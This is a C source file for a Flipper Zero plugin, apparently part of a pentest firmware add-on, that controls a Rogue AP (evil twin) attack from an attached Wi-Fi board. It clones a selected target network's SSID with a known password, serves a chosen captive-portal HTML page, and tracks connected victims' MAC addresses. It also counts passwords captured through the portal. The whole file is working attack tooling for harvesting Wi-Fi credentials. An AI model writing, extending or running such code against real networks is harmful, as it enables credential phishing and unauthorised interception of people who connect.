#include "../../module_api.h"
#include "rogue_module.h"

#include <flipper_application/flipper_application.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ROGUE_HTML_MAX 50u
#define ROGUE_LINE_CAPACITY 192u

typedef enum {
    RogueLookupPassword,
    RogueInputPassword,
    RogueListHtml,
    RogueChooseHtml,
    RogueSelectHtml,
    RogueSelectTarget,
    RogueStart,
    RogueRunning,
    RogueStopping,
    RogueStopUnconfirmed,
    RogueStopped,
    RogueError,
} RogueStage;

typedef struct {
    uint8_t id;
    char name[32];
} RogueHtmlEntry;

typedef struct {
    C5RogueLaunchContext launch;
    RogueStage stage;
    char password[64];
    RogueHtmlEntry* html;
    size_t html_count;
    size_t html_index;
    char line[ROGUE_LINE_CAPACITY];
    size_t line_length;
    bool discard_line;
    bool password_found;
    bool password_ambiguous;
    bool reply_header_seen;
    bool reply_target_seen;
    bool reply_success;
    bool attack_may_be_active;
    bool startup_password_pending;
    int32_t client_count;
    uint32_t capture_count;
    char last_mac[18];
    char error[48];
    uint32_t phase_tick;
    bool phase_started;
} RogueState;

static void rogue_scrub(void* data, size_t size) {
    volatile uint8_t* bytes = data;
    while(size--) *bytes++ = 0;
}

static void rogue_set_stage(RogueState* state, RogueStage stage) {
    state->stage = stage;
    state->phase_started = false;
}

static void rogue_redraw(const C5HostApiV3* host) {
    if(host->request_redraw) host->request_redraw(host->ctx);
}

static void rogue_status(const C5HostApiV3* host, const char* message) {
    if(host->show_status) host->show_status(host->ctx, message, 1500, true);
}

static bool rogue_send(const C5HostApiV3* host, const char* command) {
    if(!host->send_raw_lines || !command) return false;
    size_t length = strlen(command);
    if(length == 0 || length + 1 > C5_MODULE_RAW_TX_MAX) return false;
    char batch[160];
    if(length + 1 > sizeof(batch)) return false;
    memcpy(batch, command, length);
    batch[length] = '\n';
    bool sent = host->send_raw_lines(host->ctx, batch, length + 1);
    rogue_scrub(batch, sizeof(batch));
    return sent;
}

static bool rogue_valid_bssid(const char* bssid) {
    for(size_t i = 0; i < 17; i++) {
        char ch = bssid[i];
        if(i % 3 == 2) {
            if(ch != ':') return false;
        } else if(!((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'F') ||
                    (ch >= 'a' && ch <= 'f'))) {
            return false;
        }
    }
    return bssid[17] == '\0';
}

static bool rogue_valid_ssid(const char* ssid) {
    const size_t capacity = sizeof(((C5RogueLaunchContext*)0)->ssid);
    size_t length = 0;
    while(length < capacity && ssid[length]) {
        unsigned char ch = (unsigned char)ssid[length++];
        if(ch < 32 || ch == 127 || ch == '"' || ch == '\\') return false;
    }
    return length >= 1 && length < capacity && ssid[length] == '\0' &&
           strcmp(ssid, "Hidden") != 0;
}

static bool rogue_valid_password(const char* password) {
    const size_t capacity = sizeof(((RogueState*)0)->password);
    size_t length = 0;
    while(length < capacity && password[length]) {
        unsigned char ch = (unsigned char)password[length++];
        if(ch < 32 || ch > 126 || ch == '"' || ch == '\\') return false;
    }
    return length >= 8 && length < capacity && password[length] == '\0';
}

static bool rogue_equal_nocase(char left, char right) {
    if(left >= 'A' && left <= 'Z') left += 'a' - 'A';
    if(right >= 'A' && right <= 'Z') right += 'a' - 'A';
    return left == right;
}

static bool rogue_line_has_bssid(const char* line, const char* bssid) {
    for(const char* cursor = line; *cursor; cursor++) {
        size_t i = 0;
        while(i < 17 && cursor[i] && rogue_equal_nocase(cursor[i], bssid[i])) i++;
        if(i == 17 && (cursor[17] == ',' || cursor[17] == ' ' || cursor[17] == '\0'))
            return true;
    }
    return false;
}

static bool rogue_parse_saved_password(const char* line, const char* target, char* out) {
    while(*line == ' ' || *line == '\t') line++;
    if(*line++ != '"') return false;
    const char* ssid_end = strchr(line, '"');
    if(!ssid_end || (size_t)(ssid_end - line) != strlen(target) ||
       memcmp(line, target, (size_t)(ssid_end - line)) != 0) return false;
    line = ssid_end + 1;
    while(*line == ' ' || *line == '\t') line++;
    if(*line++ != ',') return false;
    while(*line == ' ' || *line == '\t') line++;
    if(*line++ != '"') return false;
    const char* pass_end = strchr(line, '"');
    if(!pass_end || pass_end - line < 8 || pass_end - line > 63) return false;
    size_t length = (size_t)(pass_end - line);
    memcpy(out, line, length);
    out[length] = '\0';
    pass_end++;
    while(*pass_end == ' ' || *pass_end == '\t') pass_end++;
    return *pass_end == '\0' && rogue_valid_password(out);
}

static void rogue_fail(RogueState* state, const C5HostApiV3* host, const char* message) {
    rogue_set_stage(state, RogueError);
    snprintf(state->error, sizeof(state->error), "%s", message);
    rogue_status(host, message);
    rogue_redraw(host);
}

static bool rogue_request_password(RogueState* state, const C5HostApiV3* host) {
    C5TextInputRequest request = {
        .capacity = sizeof(state->password),
        .minimum_length = 8,
    };
    snprintf(request.header, sizeof(request.header), "%s",
             state->password_ambiguous ? "Saved passwords differ" : "Rogue AP password");
    rogue_set_stage(state, RogueInputPassword);
    if(!host->request_text_input(host->ctx, &request)) {
        rogue_status(host, "Password input unavailable");
        return false;
    }
    rogue_redraw(host);
    return true;
}

static void rogue_request_html(RogueState* state, const C5HostApiV3* host) {
    state->html = calloc(ROGUE_HTML_MAX, sizeof(*state->html));
    if(!state->html) {
        rogue_fail(state, host, "No RAM for HTML list");
        return;
    }
    if(!rogue_send(host, "list_sd")) {
        rogue_fail(state, host, "HTML list command failed");
        return;
    }
    state->html_count = 0;
    state->reply_header_seen = false;
    rogue_set_stage(state, RogueListHtml);
    rogue_redraw(host);
}

static void rogue_select_target(RogueState* state, const C5HostApiV3* host) {
    char command[40];
    int length = snprintf(command, sizeof(command), "select_networks %u",
                          (unsigned)state->launch.selected_number);
    if(length < 0 || (size_t)length >= sizeof(command) || !rogue_send(host, command)) {
        rogue_fail(state, host, "Target command failed");
        return;
    }
    state->reply_header_seen = false;
    state->reply_target_seen = false;
    rogue_set_stage(state, RogueSelectTarget);
    rogue_redraw(host);
}

static void rogue_start(RogueState* state, const C5HostApiV3* host) {
    char command[160];
    int length = snprintf(command, sizeof(command), "start_rogueap \"%s\" \"%s\"",
                          state->launch.ssid, state->password);
    bool sent = length >= 0 && (size_t)length < sizeof(command) &&
                rogue_send(host, command);
    rogue_scrub(command, sizeof(command));
    if(!sent) {
        rogue_fail(state, host, "Rogue AP command failed");
        return;
    }
    state->attack_may_be_active = true;
    state->reply_success = false;
    rogue_set_stage(state, RogueStart);
    rogue_redraw(host);
}

static void rogue_parse_html(RogueState* state, const char* line) {
    if(strstr(line, "HTML files found on SD card:")) {
        state->reply_header_seen = true;
        return;
    }
    if(!state->reply_header_seen || state->html_count >= ROGUE_HTML_MAX) return;
    char* end = NULL;
    unsigned long id = strtoul(line, &end, 10);
    if(end == line || id == 0 || id > 255 || (*end != ' ' && *end != '\t')) return;
    while(*end == ' ' || *end == '\t') end++;
    if(!*end) return;
    RogueHtmlEntry* entry = &state->html[state->html_count++];
    entry->id = (uint8_t)id;
    snprintf(entry->name, sizeof(entry->name), "%s", end);
}

static void rogue_process_line(RogueState* state, const C5HostApiV3* host) {
    state->line[state->line_length] = '\0';
    const char* line = state->line;
    if((state->stage == RogueStopping || state->stage == RogueStopUnconfirmed) &&
       strcmp(line, "All operations stopped.") == 0) {
        state->attack_may_be_active = false;
        rogue_set_stage(state, RogueStopped);
        rogue_status(host, "Rogue AP stopped");
    } else if(state->stage == RogueLookupPassword) {
        char candidate[64] = {0};
        if(rogue_parse_saved_password(line, state->launch.ssid, candidate) &&
           !state->password_ambiguous) {
            if(!state->password_found) {
                snprintf(state->password, sizeof(state->password), "%s", candidate);
                state->password_found = true;
            } else if(strcmp(state->password, candidate) != 0) {
                rogue_scrub(state->password, sizeof(state->password));
                state->password_found = false;
                state->password_ambiguous = true;
            }
        }
        rogue_scrub(candidate, sizeof(candidate));
    } else if(state->stage == RogueListHtml) {
        rogue_parse_html(state, line);
    } else if(state->stage == RogueSelectHtml) {
        if(strstr(line, "Loaded HTML file:")) state->reply_success = true;
    } else if(state->stage == RogueSelectTarget) {
        if(strstr(line, "Selected Networks:")) state->reply_header_seen = true;
        else if(state->reply_header_seen && rogue_line_has_bssid(line, state->launch.bssid))
            state->reply_target_seen = true;
    } else if(state->stage == RogueStart) {
        if(strcmp(line, "Rogue AP started successfully!") == 0) {
            state->reply_success = true;
            state->startup_password_pending = true;
            rogue_set_stage(state, RogueRunning);
        }
    }
    if(state->stage == RogueRunning) {
        const char* marker = strstr(line, "AP: Client connected - MAC:");
        if(marker) {
            marker += strlen("AP: Client connected - MAC:");
            while(*marker == ' ') marker++;
            snprintf(state->last_mac, sizeof(state->last_mac), "%.17s", marker);
            if(state->client_count < INT32_MAX) state->client_count++;
        } else if(strstr(line, "AP: Client disconnected - MAC:")) {
            if(state->client_count > 0) state->client_count--;
        } else if((marker = strstr(line, "Portal: Client count ="))) {
            int count = -1;
            if(sscanf(marker, "Portal: Client count = %d", &count) == 1 && count >= 0)
                state->client_count = count;
        } else if(strstr(line, "Custom HTML loaded (")) {
            state->startup_password_pending = false;
        } else if((marker = strstr(line, "Portal password received:"))) {
            marker += strlen("Portal password received:");
            while(*marker == ' ') marker++;
            if(*marker) state->capture_count++;
        } else if((marker = strstr(line, "Password:"))) {
            if(state->startup_password_pending) {
                state->startup_password_pending = false;
            } else {
                marker += strlen("Password:");
                while(*marker == ' ') marker++;
                if(*marker) state->capture_count++;
            }
        }
    }
    rogue_scrub(state->line, sizeof(state->line));
    state->line_length = 0;
    rogue_redraw(host);
}

static void rogue_finish_reply(RogueState* state, const C5HostApiV3* host) {
    if(state->stage == RogueLookupPassword) {
        if(state->password_found) rogue_request_html(state, host);
        else rogue_request_password(state, host);
    } else if(state->stage == RogueListHtml) {
        if(state->html_count == 0) rogue_fail(state, host, "No HTML files on SD");
        else {
            rogue_set_stage(state, RogueChooseHtml);
            rogue_redraw(host);
        }
    } else if(state->stage == RogueSelectHtml) {
        if(state->reply_success) rogue_select_target(state, host);
        else rogue_fail(state, host, "HTML selection failed");
    } else if(state->stage == RogueSelectTarget) {
        if(state->reply_header_seen && state->reply_target_seen) rogue_start(state, host);
        else rogue_fail(state, host, "Target changed; scan again");
    } else if(state->stage == RogueStart) {
        if(!state->reply_success) rogue_fail(state, host, "Rogue AP start failed");
    } else if(state->stage == RogueStopping) {
        rogue_set_stage(state, RogueStopUnconfirmed);
        snprintf(state->error, sizeof(state->error), "No stop ACK; Back retries");
        rogue_status(host, state->error);
        rogue_redraw(host);
    }
}

static void* rogue_enter(const C5HostApiV3* host, const void* params, size_t size) {
    if(!host || host->version != C5_MODULE_API_VERSION ||
       host->size < sizeof(C5HostApiV3) || !host->send_raw_lines ||
       !host->request_text_input || !params || size != sizeof(C5RogueLaunchContext))
        return NULL;
    const C5RogueLaunchContext* launch = params;
    if(launch->version != C5_ROGUE_LAUNCH_VERSION ||
       launch->size != sizeof(C5RogueLaunchContext) ||
       launch->selected_number == 0 || launch->selected_number > 64 ||
       !memchr(launch->ssid, '\0', sizeof(launch->ssid)) ||
       !memchr(launch->bssid, '\0', sizeof(launch->bssid)) ||
       !rogue_valid_ssid(launch->ssid) || !rogue_valid_bssid(launch->bssid) ||
       !launch->ticks_per_second || launch->ticks_per_second > 1000000u)
        return NULL;
    RogueState* state = calloc(1, sizeof(*state));
    if(!state) return NULL;
    state->launch = *launch;
    state->client_count = 0;
    if(!rogue_send(host, "show_pass evil")) {
        free(state);
        return NULL;
    }
    rogue_set_stage(state, RogueLookupPassword);
    return state;
}

static void rogue_leave(void* opaque, const C5HostApiV3* host) {
    RogueState* state = opaque;
    if(!state) return;
    if(host && state->attack_may_be_active)
        rogue_send(host, "stop");
    free(state->html);
    rogue_scrub(state, sizeof(*state));
    free(state);
}

static void rogue_on_bytes(
    void* opaque, const C5HostApiV3* host, const uint8_t* bytes, size_t length) {
    RogueState* state = opaque;
    if(!state || !host || !bytes) return;
    for(size_t i = 0; i < length; i++) {
        char ch = (char)bytes[i];
        if(ch == '\r') continue;
        if(ch == '>' && !state->discard_line && state->line_length == 0) {
            rogue_finish_reply(state, host);
            continue;
        }
        if(ch == '\n') {
            if(!state->discard_line && state->line_length) rogue_process_line(state, host);
            if(state->discard_line) rogue_scrub(state->line, sizeof(state->line));
            state->line_length = 0;
            state->discard_line = false;
            continue;
        }
        if(state->discard_line) continue;
        if(state->line_length + 1 >= sizeof(state->line)) {
            rogue_scrub(state->line, sizeof(state->line));
            state->line_length = 0;
            state->discard_line = true;
            continue;
        }
        state->line[state->line_length++] = ch;
    }
}

static C5InputResult rogue_on_input(
    void* opaque, const C5HostApiV3* host, const InputEvent* event) {
    RogueState* state = opaque;
    if(!state || !host || !event) return C5InputIgnored;
    if(event->type == InputTypeLong && event->key == InputKeyOk) return C5InputConsumed;
    if(event->type != InputTypeShort && event->type != InputTypeRepeat)
        return C5InputConsumed;
    if(event->key == InputKeyBack && event->type == InputTypeShort) {
        if(state->stage == RogueStopped) return C5InputSwitchModule;
        if(state->stage == RogueStopping) return C5InputConsumed;
        if(state->attack_may_be_active) {
            if(!rogue_send(host, "stop")) {
                rogue_set_stage(state, RogueStopUnconfirmed);
                snprintf(state->error, sizeof(state->error), "Stop TX failed; Back retries");
                rogue_status(host, state->error);
                rogue_redraw(host);
                return C5InputConsumed;
            }
            rogue_set_stage(state, RogueStopping);
            rogue_redraw(host);
            return C5InputConsumed;
        }
        return C5InputSwitchModule;
    }
    if(state->stage == RogueInputPassword && event->key == InputKeyOk &&
       event->type == InputTypeShort) {
        rogue_request_password(state, host);
        return C5InputConsumed;
    }
    if(state->stage != RogueChooseHtml) return C5InputConsumed;
    if(event->key == InputKeyUp && state->html_index) state->html_index--;
    else if(event->key == InputKeyDown && state->html_index + 1 < state->html_count)
        state->html_index++;
    else if(event->key == InputKeyOk && event->type == InputTypeShort) {
        char command[40];
        int written = snprintf(command, sizeof(command), "select_html %u",
                               (unsigned)state->html[state->html_index].id);
        if(written < 0 || (size_t)written >= sizeof(command) ||
           !rogue_send(host, command)) {
            rogue_fail(state, host, "HTML selection command failed");
            return C5InputConsumed;
        }
        free(state->html);
        state->html = NULL;
        state->html_count = 0;
        state->reply_success = false;
        rogue_set_stage(state, RogueSelectHtml);
    }
    rogue_redraw(host);
    return C5InputConsumed;
}

static void rogue_on_text_input(
    void* opaque, const C5HostApiV3* host, bool accepted, const char* text) {
    RogueState* state = opaque;
    if(!state || !host || state->stage != RogueInputPassword) return;
    if(!accepted) {
        rogue_redraw(host);
        return;
    }
    if(!text || !rogue_valid_password(text)) {
        rogue_status(host, "Use 8-63 safe chars");
        return;
    }
    snprintf(state->password, sizeof(state->password), "%s", text);
    rogue_request_html(state, host);
}

static void rogue_draw(void* opaque, const C5HostApiV3* host, Canvas* canvas) {
    (void)host;
    const RogueState* state = opaque;
    if(!state || !canvas) return;
    canvas_set_color(canvas, ColorBlack);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 4, 12, "Rogue AP");
    canvas_set_font(canvas, FontSecondary);
    if(state->stage == RogueLookupPassword) {
        canvas_draw_str(canvas, 4, 31, "Checking saved password...");
    } else if(state->stage == RogueInputPassword) {
        if(state->password_ambiguous) {
            canvas_draw_str(canvas, 4, 31, "Saved passwords differ");
            canvas_draw_str(canvas, 4, 42, "Enter password manually");
        } else {
            canvas_draw_str(canvas, 4, 31, "Enter WPA2 password");
        }
        canvas_draw_str(canvas, 4, 52, "OK: input  Back: exit");
    } else if(state->stage == RogueListHtml) {
        canvas_draw_str(canvas, 4, 31, "Loading HTML files...");
    } else if(state->stage == RogueChooseHtml) {
        canvas_draw_str(canvas, 4, 22, "Select HTML:");
        size_t first = state->html_index >= 2 ? state->html_index - 2 : 0;
        for(size_t i = first; i < state->html_count && i < first + 3; i++) {
            char line[40];
            snprintf(line, sizeof(line), "%c %u %.28s",
                     i == state->html_index ? '>' : ' ',
                     (unsigned)state->html[i].id, state->html[i].name);
            canvas_draw_str(canvas, 4, 32 + (int)(i - first) * 10, line);
        }
    } else if(state->stage == RogueSelectHtml || state->stage == RogueSelectTarget ||
              state->stage == RogueStart) {
        canvas_draw_str(canvas, 4, 31,
                        state->stage == RogueSelectHtml ? "Loading HTML..." :
                        (state->stage == RogueSelectTarget ? "Checking target..." :
                                                           "Starting AP..."));
    } else if(state->stage == RogueRunning) {
        char line[48];
        snprintf(line, sizeof(line), "SSID: %.28s", state->launch.ssid);
        canvas_draw_str(canvas, 4, 23, line);
        snprintf(line, sizeof(line), "Clients: %ld", (long)state->client_count);
        canvas_draw_str(canvas, 4, 33, line);
        snprintf(line, sizeof(line), "Captured: %lu", (unsigned long)state->capture_count);
        canvas_draw_str(canvas, 4, 43, line);
        if(state->last_mac[0]) {
            snprintf(line, sizeof(line), "MAC: %.17s", state->last_mac);
            canvas_draw_str(canvas, 4, 53, line);
        }
        canvas_draw_str(canvas, 4, 63, "Back: stop");
    } else if(state->stage == RogueStopping) {
        canvas_draw_str(canvas, 4, 31, "Stopping Rogue AP...");
        canvas_draw_str(canvas, 4, 52, "Waiting for stop ACK");
    } else if(state->stage == RogueStopUnconfirmed) {
        canvas_draw_str(canvas, 4, 31, state->error);
        canvas_draw_str(canvas, 4, 52, "Back: retry stop");
    } else if(state->stage == RogueStopped) {
        canvas_draw_str(canvas, 4, 31, "Rogue AP stopped");
        canvas_draw_str(canvas, 4, 52, "Back: exit");
    } else {
        canvas_draw_str(canvas, 4, 31,
                        state->error[0] ? state->error : "Operation unavailable");
        canvas_draw_str(canvas, 4, 52, "Back: exit");
    }
}

static void rogue_tick(void* opaque, const C5HostApiV3* host, uint32_t now_ticks) {
    RogueState* state = opaque;
    if(!state || !host) return;
    uint32_t seconds = 0;
    if(state->stage == RogueLookupPassword || state->stage == RogueListHtml ||
       state->stage == RogueSelectTarget) seconds = 5;
    else if(state->stage == RogueSelectHtml) seconds = 10;
    else if(state->stage == RogueStart) seconds = 15;
    else if(state->stage == RogueStopping) seconds = 5;
    if(!seconds) return;
    if(!state->phase_started) {
        state->phase_tick = now_ticks;
        state->phase_started = true;
        return;
    }
    if((uint32_t)(now_ticks - state->phase_tick) >=
       state->launch.ticks_per_second * seconds) {
        if(state->stage == RogueStopping) {
            rogue_set_stage(state, RogueStopUnconfirmed);
            snprintf(state->error, sizeof(state->error), "No stop ACK; Back retries");
            rogue_status(host, state->error);
            rogue_redraw(host);
        } else {
            rogue_fail(state, host, "Rogue AP reply timed out");
        }
    }
}

static const C5ModuleV3 c5_rogue_module = {
    .version = C5_MODULE_API_VERSION,
    .size = sizeof(C5ModuleV3),
    .enter = rogue_enter,
    .leave = rogue_leave,
    .on_bytes = rogue_on_bytes,
    .on_input = rogue_on_input,
    .on_text_input = rogue_on_text_input,
    .draw = rogue_draw,
    .tick = rogue_tick,
};

static const FlipperAppPluginDescriptor c5_rogue_descriptor = {
    .appid = C5_MODULE_APP_ID,
    .ep_api_version = C5_MODULE_API_VERSION,
    .entry_point = &c5_rogue_module,
};

const FlipperAppPluginDescriptor* lab_c5_rogue_plugin_ep(void) {
    return &c5_rogue_descriptor;
}
